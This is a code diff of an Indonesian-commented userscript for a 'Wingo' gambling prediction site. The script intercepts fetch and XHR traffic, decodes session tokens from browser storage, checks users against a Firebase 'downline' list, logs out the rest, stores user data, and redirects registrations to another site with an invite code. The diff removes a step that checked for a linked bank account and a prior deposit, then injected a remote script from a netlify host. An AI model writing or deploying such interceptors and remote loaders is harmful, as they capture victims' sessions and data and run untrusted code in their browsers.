@@ -1,7 +1,7 @@
 (function() {
     'use strict';
 
-    console.log('🚀 Wingo Full Script Active (AutoSave + Login Check + Withdraw Validation + Deposit Check)');
+    console.log('🚀 Wingo Full Script Active (AutoSave + Login Check)');
 
     // ================================================================
     // 1. FIREBASE CONFIG & LOAD
@@ -163,24 +163,12 @@
     }
 
     // ================================================================
-    // 4. HANDLER LOGIN + VALIDASI WITHDRAW
+    // 4. HANDLER LOGIN (hanya cek downline, tanpa validasi withdraw)
     // ================================================================
-    let pendingWithdrawCheck = false;
-    let withdrawCheckData = {
-        hasBankAccount: false,
-        firstDepositDone: false,
-        checked: false
-    };
-    let loginUserIdForCheck = null;
-
     async function handleLoginResponse(data) {
-        console.log('🔍 handleLoginResponse dipanggil, data:', data);
+        console.log('🔍 handleLoginResponse dipanggil');
 
-        if (!data) {
-            console.log('Data login kosong');
-            return;
-        }
-        if (data.code !== 0) {
+        if (!data || data.code !== 0) {
             console.log('Login gagal (code != 0), skip');
             return;
         }
@@ -211,37 +199,14 @@
             }
 
             console.log(`✅ UID ${userId} adalah downline.`);
-
-            // Hapus flag withdrawChecked agar pengecekan ulang dilakukan
-            localStorage.removeItem('withdrawChecked');
-
-            // Mulai proses validasi withdraw
-            pendingWithdrawCheck = true;
-            loginUserIdForCheck = userId;
-            withdrawCheckData.hasBankAccount = false;
-            withdrawCheckData.firstDepositDone = false;
-            withdrawCheckData.checked = false;
-
-            // Paksa ke halaman withdraw
-            console.log('🔀 Redirect ke halaman withdraw untuk validasi...');
-            window.location.hash = '#/wallet/Withdraw';
-
-            // Set timeout 15 detik
-            setTimeout(() => {
-                if (pendingWithdrawCheck && !withdrawCheckData.checked) {
-                    console.warn('⏰ Timeout validasi withdraw, logout paksa');
-                    alert('⏰ Validasi gagal (timeout). Anda akan di-logout.');
-                    forceLogoutAndRedirect();
-                }
-            }, 15000);
-
+            // Tidak ada validasi withdraw di sini
         } catch(e) {
             console.warn('❌ Gagal decode token Login:', e);
         }
     }
 
     // ================================================================
-    // 5. HANDLER GETUSERINFO (update data + ambil userRechargeTimes)
+    // 5. HANDLER GETUSERINFO (update data, tanpa validasi)
     // ================================================================
     async function handleGetUserInfo(data) {
         console.log('📊 handleGetUserInfo dipanggil');
@@ -255,18 +220,6 @@
             return;
         }
         const userId = userData.userId.toString();
-
-        // Cek userRechargeTimes untuk menentukan sudah pernah deposit
-        if (pendingWithdrawCheck && !withdrawCheckData.checked) {
-            const rechargeTimes = parseInt(userData.userRechargeTimes) || 0;
-            if (rechargeTimes > 0) {
-                withdrawCheckData.firstDepositDone = true;
-                console.log(`💳 userRechargeTimes = ${rechargeTimes} => deposit sudah pernah dilakukan.`);
-                performWithdrawCheck();
-            } else {
-                console.log(`💳 userRechargeTimes = 0, belum pernah deposit.`);
-            }
-        }
 
         await loadFirebase();
         if (db) {
@@ -292,84 +245,11 @@
     }
 
     // ================================================================
-    // 6. HANDLER GETWITHDRAWALS (cek rekening bank)
+    // 6. (Dihapus) handleGetWithdrawals dan validasi withdraw
     // ================================================================
-    function handleGetWithdrawals(data) {
-        console.log('🏦 handleGetWithdrawals dipanggil');
-        if (!data || data.code !== 0) {
-            console.log('getWithdrawals tidak sukses');
-            return;
-        }
-        if (!data.data || !data.data.withdrawalslist) {
-            console.log('Tidak ada withdrawalslist di getWithdrawals');
-            return;
-        }
-        const list = data.data.withdrawalslist;
-        const hasBank = Array.isArray(list) && list.length > 0;
-        if (pendingWithdrawCheck && !withdrawCheckData.checked) {
-            withdrawCheckData.hasBankAccount = hasBank;
-            console.log(`🏦 Rekening bank ditemukan: ${hasBank}`);
-            performWithdrawCheck();
-        }
-    }
 
     // ================================================================
-    // 7. FUNGSI VALIDASI WITHDRAW (hanya cek rekening & deposit)
-    // ================================================================
-    function performWithdrawCheck() {
-        if (withdrawCheckData.checked) return;
-        // Syarat: hasBankAccount dan firstDepositDone
-        if (withdrawCheckData.hasBankAccount === false ||
-            withdrawCheckData.firstDepositDone === false) {
-            // Belum lengkap
-            return;
-        }
-
-        withdrawCheckData.checked = true;
-        pendingWithdrawCheck = false;
-
-        const hasBank = withdrawCheckData.hasBankAccount;
-        const firstDeposit = withdrawCheckData.firstDepositDone;
-
-        console.log(`🔍 Validasi: Rekening = ${hasBank}, DepositPertama = ${firstDeposit}`);
-
-        if (hasBank && firstDeposit) {
-            console.log('✅ Validasi berhasil! Rekening terdaftar dan sudah deposit.');
-            localStorage.setItem('withdrawChecked', 'true');
-            // Inject script verifikasi
-            injectVerificationScript();
-        } else {
-            let reason = '';
-            if (!hasBank) reason += 'Belum ada rekening bank yang tertaut. ';
-            if (!firstDeposit) reason += 'Belum melakukan deposit pertama. ';
-            console.warn(`❌ Validasi gagal: ${reason}`);
-            alert(`⚠️ ${reason}Anda akan di-logout.`);
-            forceLogoutAndRedirect();
-        }
-    }
-
-    // ================================================================
-    // 8. INJECT SCRIPT VERIFIKASI
-    // ================================================================
-    function injectVerificationScript() {
-        if (document.querySelector('script[src="https://55predictor.netlify.app/script_verifikasi_398254.js"]')) {
-            console.log('✅ Verification script already loaded');
-            return;
-        }
-        var s = document.createElement('script');
-        s.src = 'https://55predictor.netlify.app/script_verifikasi_398254.js';
-        s.onload = function() {
-            console.log('✅ Verification script loaded');
-        };
-        s.onerror = function() {
-            console.error('❌ Failed to load verification script');
-        };
-        document.body.appendChild(s);
-        console.log('📦 Injection verification script');
-    }
-
-    // ================================================================
-    // 9. WINGO GAME NAVIGATION
+    // 7. WINGO GAME NAVIGATION (tombol navigasi)
     // ================================================================
     function createNav() {
         if (document.getElementById('wingo-nav-container')) return;
@@ -503,7 +383,7 @@
     }
 
     // ================================================================
-    // 10. INTERCEPTOR FETCH & XHR (case-insensitive untuk Register)
+    // 8. INTERCEPTOR FETCH & XHR
     // ================================================================
     function setupInterceptor() {
         console.log('🛠️ Setting up fetch & XHR interceptors');
@@ -541,10 +421,7 @@
                             await loadFirebase();
                             await handleGetUserInfo(data);
                         }
-                        if (urlLower.includes('/getwithdrawals')) {
-                            console.log('📡 Fetch intercepted: getWithdrawals');
-                            handleGetWithdrawals(data);
-                        }
+                        // Hapus penanganan getwithdrawals
                     }
                 }).catch(() => {});
             }
@@ -592,10 +469,7 @@
                                     handleGetUserInfo(data);
                                 });
                             }
-                            if (urlLower.includes('/getwithdrawals')) {
-                                console.log('📡 XHR intercepted: getWithdrawals');
-                                handleGetWithdrawals(data);
-                            }
+                            // Hapus penanganan getwithdrawals
                         }
                     } catch(e) {}
                 }
@@ -605,7 +479,7 @@
     }
 
     // ================================================================
-    // 11. REDIRECT REGISTER KE NUXPIRA DENGAN KODE UNDANGAN
+    // 9. REDIRECT REGISTER KE NUXPIRA DENGAN KODE UNDANGAN
     // ================================================================
     function redirectRegisterToNuxpira() {
         var currentUrl = window.location.href;
@@ -619,7 +493,7 @@
     }
 
     // ================================================================
-    // 12. INIT
+    // 10. INIT
     // ================================================================
 
     setupInterceptor();
@@ -627,16 +501,12 @@
     // Redirect Register
     setTimeout(redirectRegisterToNuxpira, 100);
 
-    // Cek status login dan flag withdrawChecked
+    // Cek status login dan downline
     setTimeout(async () => {
-        const hasToken = localStorage.getItem('token') || sessionStorage.getItem('token');
-        const withdrawChecked = localStorage.getItem('withdrawChecked') === 'true';
-
-        if (hasToken) {
-            console.log('🔑 Token ditemukan di localStorage.');
-            // Cek UID di Firebase (downline check)
+        const token = localStorage.getItem('token') || sessionStorage.getItem('token');
+        if (token) {
+            console.log('🔑 Token ditemukan.');
             try {
-                const token = hasToken;
                 const payload = JSON.parse(atob(token.split('.')[1]));
                 const userId = payload.UserId;
                 if (userId) {
@@ -649,6 +519,7 @@
                         return;
                     }
                     console.log(`✅ UID ${userId} adalah downline.`);
+                    // Tidak ada validasi withdraw di sini
                 } else {
                     console.warn('Tidak ada UserId di token, logout');
                     forceLogoutAndRedirect();
@@ -658,23 +529,6 @@
                 console.warn('Gagal decode token saat init:', e);
                 forceLogoutAndRedirect();
                 return;
-            }
-
-            if (withdrawChecked) {
-                console.log('✅ Sudah lolos validasi withdraw, inject verification script.');
-                injectVerificationScript();
-            } else {
-                console.log('🔄 Belum lolos validasi withdraw, arahkan ke halaman withdraw...');
-                window.location.hash = '#/wallet/Withdraw';
-                pendingWithdrawCheck = true;
-                // Set timeout 15 detik
-                setTimeout(() => {
-                    if (pendingWithdrawCheck && !withdrawCheckData.checked) {
-                        console.warn('⏰ Timeout validasi withdraw (init), logout paksa');
-                        alert('⏰ Validasi gagal (timeout). Anda akan di-logout.');
-                        forceLogoutAndRedirect();
-                    }
-                }, 15000);
             }
         } else {
             console.log('ℹ️ Tidak ada token, tidak perlu validasi.');
@@ -696,5 +550,5 @@
         }
     });
 
-    console.log('🚀 Wingo Full Script (AutoSave + LoginCheck + Withdraw + Deposit Validation) initialized');
+    console.log('🚀 Wingo Full Script (AutoSave + LoginCheck) initialized');
 })();
